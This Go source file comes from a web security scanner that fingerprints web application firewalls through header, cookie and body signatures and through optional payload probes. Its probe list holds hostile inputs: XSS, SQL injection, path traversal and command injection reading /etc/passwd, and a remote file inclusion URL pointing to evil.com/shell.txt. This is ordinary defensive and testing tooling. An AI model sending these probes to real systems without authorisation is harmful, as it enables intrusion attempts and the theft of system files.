package wafdetect

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"scanner/internal/modules/shared"
	"strings"
	"sync"
	"time"
)

const (
	maxBody           = 128 * 1024
	defaultReqTimeout = 10 * time.Second
	defaultConcurrent = 5
	// reqTimeout is retained for backwards references but callers should
	// prefer Config.TimeoutSeconds via Scan's Config parameter.
	reqTimeout = defaultReqTimeout
)

// Config bundles the per-scan knobs that the launch form exposes. Zero values
// fall back to the module defaults (5 concurrent probes, 10-second per-request
// timeout, payload probing enabled). Audit ER fix — previously these were
// hard-coded constants unreachable from the UI.
type Config struct {
	Targets         []string          `json:"targets"`
	Concurrency     int               `json:"concurrency,omitempty"`
	TimeoutSeconds  int               `json:"timeout_seconds,omitempty"`
	EnablePayloads  bool              `json:"enable_payloads"`
	Headers         map[string]string `json:"headers,omitempty"`
	Cookies         map[string]string `json:"cookies,omitempty"`
	UserAgent       string            `json:"user_agent,omitempty"`
	ProxyURL        string            `json:"proxy_url,omitempty"`
	BurpSuccessOnly bool              `json:"burp_success_only,omitempty"`
}

func (c Config) concurrency() int {
	if c.Concurrency <= 0 {
		return defaultConcurrent
	}
	if c.Concurrency > 50 {
		return 50
	}
	return c.Concurrency
}

func (c Config) timeout() time.Duration {
	if c.TimeoutSeconds <= 0 {
		return defaultReqTimeout
	}
	if c.TimeoutSeconds > 60 {
		return 60 * time.Second
	}
	return time.Duration(c.TimeoutSeconds) * time.Second
}

// Malicious payloads designed to trigger WAF responses
var probePayloads = []struct {
	Name string
	Path string // appended to the target URL
}{
	{"XSS Probe", "/?test=<script>alert(1)</script>"},
	{"SQLi Probe", "/?id=1'+OR+1=1--"},
	{"Path Traversal", "/etc/passwd"},
	{"Command Injection", "/?cmd=;cat+/etc/passwd"},
	{"LFI Probe", "/?file=../../../../etc/passwd"},
	{"RFI Probe", "/?page=http://evil.com/shell.txt"},
	{"User-Agent Anomaly", "/"}, // sent with suspicious UA
	{"Protocol Violation", "/?%%00test"},
}

// Detection represents a single WAF detection evidence
type Detection struct {
	Method      string `json:"method"`     // "header", "cookie", "body", "status", "payload"
	Detail      string `json:"detail"`     // what was matched
	Confidence  int    `json:"confidence"` // 1-100
	RawRequest  string `json:"raw_request,omitempty"`
	RawResponse string `json:"raw_response,omitempty"`
}

// TargetResult holds all WAF detection info for a URL
type TargetResult struct {
	URL         string      `json:"url"`
	Reachable   bool        `json:"reachable"`
	Error       string      `json:"error,omitempty"`
	WAFDetected bool        `json:"waf_detected"`
	WAFName     string      `json:"waf_name"`
	WAFVendor   string      `json:"waf_vendor"`
	Confidence  int         `json:"confidence"` // overall 0-100
	Detections  []Detection `json:"detections"`
	StatusCode  int         `json:"status_code"`
	Server      string      `json:"server"`
	AllHeaders  string      `json:"all_headers"` // raw headers for detail view
	// Raw capture of the baseline probe so the finding can be replayed.
	// Payload probes' raw bytes live on the Detection entries themselves.
	RawRequest  string `json:"raw_request,omitempty"`
	RawResponse string `json:"raw_response,omitempty"`
}

// ScanResult is the full output
type ScanResult struct {
	Results []TargetResult `json:"results"`
}

type ProgressFunc func(done int, msg string)
type PartialFunc func(*ScanResult)

// ProbesPerTarget returns the number of HTTP probes detectWAF performs per
// target (1 baseline + N payload probes). Used to size the progress total.
func ProbesPerTarget() int { return 1 + len(probePayloads) }

// ProbesPerTargetFor returns the probe count adjusted for the caller's config
// (baseline only when payloads are disabled).
func ProbesPerTargetFor(cfg Config) int {
	if !cfg.EnablePayloads {
		return 1
	}
	return ProbesPerTarget()
}

func Scan(cfg Config, opts *shared.HTTPOptions, progress ProgressFunc, partial PartialFunc) *ScanResult {
	targets := cfg.Targets
	result := &ScanResult{}
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.concurrency())
	var wg sync.WaitGroup

	probesDone := 0
	probesPer := ProbesPerTargetFor(cfg)
	reqTimeout := cfg.timeout()
	enablePayloads := cfg.EnablePayloads

	// Audit: stream partial snapshots so the results page renders rows as
	// each target finishes instead of staying on "Waiting for first
	// results..." for the entire multi-minute scan.
	throttle := shared.NewPartialThrottler(2 * time.Second)
	pushPartial := func() {
		if partial == nil {
			return
		}
		if !throttle.ShouldFire() {
			return
		}
		mu.Lock()
		snap := &ScanResult{Results: append([]TargetResult(nil), result.Results...)}
		mu.Unlock()
		partial(snap)
	}

	// Reachability preflight: skip TLS-dead targets up front (they'd otherwise
	// waste every probe) — recorded as explicit "unreachable" rows.
	if opts != nil && opts.PreflightEnabled {
		live, dead := shared.FilterReachable(opts.Ctx, opts, targets, opts.PreflightTimeout, cfg.concurrency())
		for t, reason := range dead {
			result.Results = append(result.Results, TargetResult{URL: t, Reachable: false, Error: "unreachable — " + reason})
		}
		targets = live
	}

	for _, t := range targets {
		// Cancellation fast-path (audit B41).
		if opts != nil && opts.Done() {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(target string) {
			defer wg.Done()
			defer func() { <-sem }()

			localProbes := 0
			tr := detectWAF(target, opts, reqTimeout, enablePayloads, func(msg string) {
				mu.Lock()
				probesDone++
				localProbes++
				cur := probesDone
				mu.Unlock()
				if progress != nil {
					progress(cur, fmt.Sprintf("%s · %s", target, msg))
				}
			})

			mu.Lock()
			// If detectWAF returned early (no probes fired), still account for
			// the slot allocated to this target so percentage doesn't stall.
			if localProbes < probesPer {
				probesDone += probesPer - localProbes
			}
			cur := probesDone
			result.Results = append(result.Results, *tr)
			mu.Unlock()
			pushPartial()
			if progress != nil {
				if tr.WAFDetected {
					progress(cur, fmt.Sprintf("⚠ %s — %s (%d%% confidence, %d evidence)", target, tr.WAFName, tr.Confidence, len(tr.Detections)))
				} else {
					progress(cur, fmt.Sprintf("✓ %s — No WAF detected", target))
				}
			}
		}(t)
	}
	wg.Wait()
	return result
}

func newClient(opts *shared.HTTPOptions, timeout time.Duration) *http.Client {
	if timeout <= 0 {
		timeout = defaultReqTimeout
	}
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext:     shared.BoundDialer(nil, 5*time.Second).DialContext,
		// Per-target transport: bound + self-expire idle sockets so they don't
		// accumulate across a large scan's targets.
		IdleConnTimeout:     90 * time.Second,
		MaxIdleConnsPerHost: 4,
	}
	if opts != nil {
		opts.ApplyTransport(transport)
	}
	return &http.Client{
		Timeout:   timeout,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) > 3 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func detectWAF(target string, opts *shared.HTTPOptions, timeout time.Duration, enablePayloads bool, logFn func(string)) *TargetResult {
	result := &TargetResult{URL: target}

	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		target = "https://" + target
		result.URL = target
	}

	client := newClient(opts, timeout)

	// Phase 1: Normal request — analyze headers, cookies, body
	if logFn != nil {
		logFn("baseline request (headers/cookies/body)")
	}
	resp, body, rawReq, rawResp, err := doRequest(client, target, "scaNNer/1.0", opts)
	if err != nil {
		opts.RecordError(shared.ClassifyError(err))
		result.Error = simplifyErr(err)
		return result
	}
	result.Reachable = true
	result.StatusCode = resp.StatusCode
	result.Server = resp.Header.Get("Server")
	result.AllHeaders = formatHeaders(resp)
	result.RawRequest = rawReq
	result.RawResponse = rawResp
	opts.ReplayHit("GET", target)

	// Phase 2: Check all WAF signatures against normal response.
	// Lowercase the body ONCE up-front: matchSignature + buildDetections will
	// be invoked ~24 times against this same body, and the body can be up to
	// 128 KB, so per-call ToLower was a real allocation hotspot.
	scores := map[string]int{} // waf name -> total score
	wafMap := map[string]*WAFSignature{}

	lowerBody := strings.ToLower(body)
	for i := range WAFDatabase {
		sig := &WAFDatabase[i]
		score := matchSignature(sig, resp, lowerBody)
		if score > 0 {
			scores[sig.Name] += score
			wafMap[sig.Name] = sig
			for _, d := range buildDetections(sig, resp, lowerBody) {
				result.Detections = append(result.Detections, d)
			}
		}
	}

	// Audit fix: previously invoked logFn here to note "signature match
	// complete (N candidates)"; but logFn increments probesDone in the caller
	// closure while ProbesPerTarget() only counts 1 baseline + N payloads, so
	// this bonus tick made the progress bar overshoot 100% on successful
	// targets. Removed.

	// Phase 3: Payload probing — send malicious requests, compare behavior.
	// Skipped entirely when the launch form disables payload probing (safer
	// against fragile targets — signature/header analysis still runs and the
	// verdict below is derived from `scores` alone).
	normalCode := resp.StatusCode
	if enablePayloads {
	for i, payload := range probePayloads {
		// Audit fix: fast-exit on Cancel so we stop logging + counting
		// probes (~40 spurious progress writes and one full round of doomed
		// GETs per cancelled target).
		if opts.Done() {
			return result
		}
		if logFn != nil {
			logFn(fmt.Sprintf("payload probe %d/%d: %s", i+1, len(probePayloads), payload.Name))
		}
		probeURL := buildProbeURL(target, payload.Path)
		ua := "scaNNer/1.0"
		if payload.Name == "User-Agent Anomaly" {
			ua = "Mozilla/5.0 (compatible; Nimbostratus-Bot/1.0; +http://cloudsystemnetworks.com)"
		}

		probeResp, probeBody, probeRawReq, probeRawResp, err := doRequest(client, probeURL, ua, opts)
		if err != nil {
			// Surface context/network-side errors via the sticky warnings
			// banner instead of silently swallowing them.
			opts.RecordError(shared.ClassifyError(err))
			continue
		}

		// If probe gets blocked (different status), it's WAF evidence
		blocked := false
		if probeResp.StatusCode != normalCode &&
			(probeResp.StatusCode == 403 || probeResp.StatusCode == 406 ||
				probeResp.StatusCode == 429 || probeResp.StatusCode == 503 ||
				probeResp.StatusCode == 999) {
			blocked = true
		}

		if blocked {
			result.Detections = append(result.Detections, Detection{
				Method:      "payload",
				Detail:      fmt.Sprintf("%s → HTTP %d", payload.Name, probeResp.StatusCode),
				Confidence:  30,
				RawRequest:  probeRawReq,
				RawResponse: probeRawResp,
			})
			// Check which WAF blocked it. Lowercase the probe body once and
			// reuse across the 24-signature pass.
			lowerProbeBody := strings.ToLower(probeBody)
			for i := range WAFDatabase {
				sig := &WAFDatabase[i]
				s := matchSignature(sig, probeResp, lowerProbeBody)
				if s > 0 {
					scores[sig.Name] += s + 10 // bonus for payload block
					wafMap[sig.Name] = sig
				}
			}
		}
	}
	}

	// Phase 4: Determine winner
	bestName := ""
	bestScore := 0
	for name, score := range scores {
		if score > bestScore {
			bestScore = score
			bestName = name
		}
	}

	if bestName != "" && bestScore >= 15 {
		result.WAFDetected = true
		result.WAFName = bestName
		result.WAFVendor = wafMap[bestName].Vendor
		result.Confidence = bestScore
		if result.Confidence > 100 {
			result.Confidence = 100
		}
	} else if len(result.Detections) > 0 && bestScore > 0 {
		// Some signals but low confidence. Audit fix: require bestScore > 0
		// so payload-only Detections (e.g. a vanilla nginx that just returns
		// 403 for /etc/passwd, no signature match) do not flip WAFDetected
		// with a bogus "Unknown WAF" verdict.
		result.WAFDetected = true
		result.WAFName = "Unknown WAF"
		result.WAFVendor = "Unknown"
		result.Confidence = bestScore
	}

	return result
}

// matchSignature scores a WAF signature against an HTTP response. lowerBody
// MUST be the already-lowercased response body (caller is expected to compute
// it once per response, not per signature — see detectWAF). Pattern slices on
// the signature are pre-lowercased in signatures.go::init.
func matchSignature(sig *WAFSignature, resp *http.Response, lowerBody string) int {
	score := 0

	// Header matches
	for hdr, patterns := range sig.headersLower {
		val := resp.Header.Get(hdr)
		if val != "" && matchHeader(val, patterns) {
			score += 25
		}
	}

	// Cookie matches
	if len(sig.cookieLower) > 0 {
		for _, cookie := range resp.Cookies() {
			lowerName := strings.ToLower(cookie.Name)
			for _, pattern := range sig.cookieLower {
				if strings.Contains(lowerName, pattern) {
					score += 20
				}
			}
		}
	}

	// Body matches
	for _, pattern := range sig.bodyLower {
		if strings.Contains(lowerBody, pattern) {
			score += 30
		}
	}

	// Status code matches
	for _, code := range sig.Codes {
		if resp.StatusCode == code {
			score += 5
		}
	}

	return score
}

// buildDetections returns evidence rows for a matching signature. lowerBody
// MUST be the already-lowercased response body (see matchSignature).
func buildDetections(sig *WAFSignature, resp *http.Response, lowerBody string) []Detection {
	var dets []Detection

	for hdr, patterns := range sig.headersLower {
		val := resp.Header.Get(hdr)
		if val != "" && matchHeader(val, patterns) {
			dets = append(dets, Detection{
				Method:     "header",
				Detail:     fmt.Sprintf("%s: %s", hdr, truncate(val, 80)),
				Confidence: 25,
			})
		}
	}

	if len(sig.cookieLower) > 0 {
		for _, cookie := range resp.Cookies() {
			lowerName := strings.ToLower(cookie.Name)
			for _, pattern := range sig.cookieLower {
				if strings.Contains(lowerName, pattern) {
					dets = append(dets, Detection{
						Method:     "cookie",
						Detail:     fmt.Sprintf("Cookie: %s", cookie.Name),
						Confidence: 20,
					})
				}
			}
		}
	}

	for j, pattern := range sig.bodyLower {
		if strings.Contains(lowerBody, pattern) {
			// Show the original-cased pattern in the detail string for
			// readability — bodyLower indices align with sig.Body.
			orig := pattern
			if j < len(sig.Body) {
				orig = sig.Body[j]
			}
			dets = append(dets, Detection{
				Method:     "body",
				Detail:     fmt.Sprintf("Body contains: %s", truncate(orig, 60)),
				Confidence: 30,
			})
		}
	}

	return dets
}

func doRequest(client *http.Client, targetURL, ua string, opts *shared.HTTPOptions) (*http.Response, string, string, string, error) {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return nil, "", "", "", err
	}
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	if opts != nil {
		opts.ApplyTo(req)
	}
	// Audit: ApplyTo unconditionally overwrites User-Agent when Settings has
	// one configured, which silently neutralises the "User-Agent Anomaly"
	// probe. Set the probe-specific UA after ApplyTo so it always wins.
	req.Header.Set("User-Agent", ua)
	req = opts.BindContext(req)

	rawReq := shared.CaptureRequest(req)

	resp, err := client.Do(req)
	if err != nil {
		return nil, "", rawReq, "", err
	}
	rawResp := shared.CaptureResponse(resp)
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, maxBody))
	return resp, string(bodyBytes), rawReq, rawResp, nil
}

func buildProbeURL(base, path string) string {
	u, err := url.Parse(base)
	if err != nil {
		return base + path
	}
	// Replace path and query.
	probe, err := url.Parse(path)
	if err != nil {
		return base + path
	}
	// Audit fix: preserve the base URL's path prefix so a target like
	//   https://target.com/app/login
	// gets probed at
	//   https://target.com/app/login/etc/passwd
	// instead of the rewritten
	//   https://target.com/etc/passwd
	// which would bypass WAF rules scoped to /app/*. When the probe.Path is
	// empty (query-only probes like "/?test=..."), just keep the base path.
	basePath := strings.TrimRight(u.Path, "/")
	if probe.Path == "" || probe.Path == "/" {
		u.Path = basePath
		if u.Path == "" {
			u.Path = "/"
		}
	} else {
		u.Path = basePath + probe.Path
	}
	u.RawQuery = probe.RawQuery
	return u.String()
}

func formatHeaders(resp *http.Response) string {
	var sb strings.Builder
	for k, vals := range resp.Header {
		for _, v := range vals {
			sb.WriteString(k + ": " + v + "\n")
		}
	}
	return sb.String()
}

func truncate(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

func simplifyErr(err error) string {
	s := err.Error()
	if strings.Contains(s, "no such host") {
		return "DNS resolution failed"
	}
	if strings.Contains(s, "connection refused") {
		return "Connection refused"
	}
	if strings.Contains(s, "timeout") || strings.Contains(s, "Timeout") {
		return "Timeout"
	}
	if len(s) > 100 {
		return s[:100]
	}
	return s
}
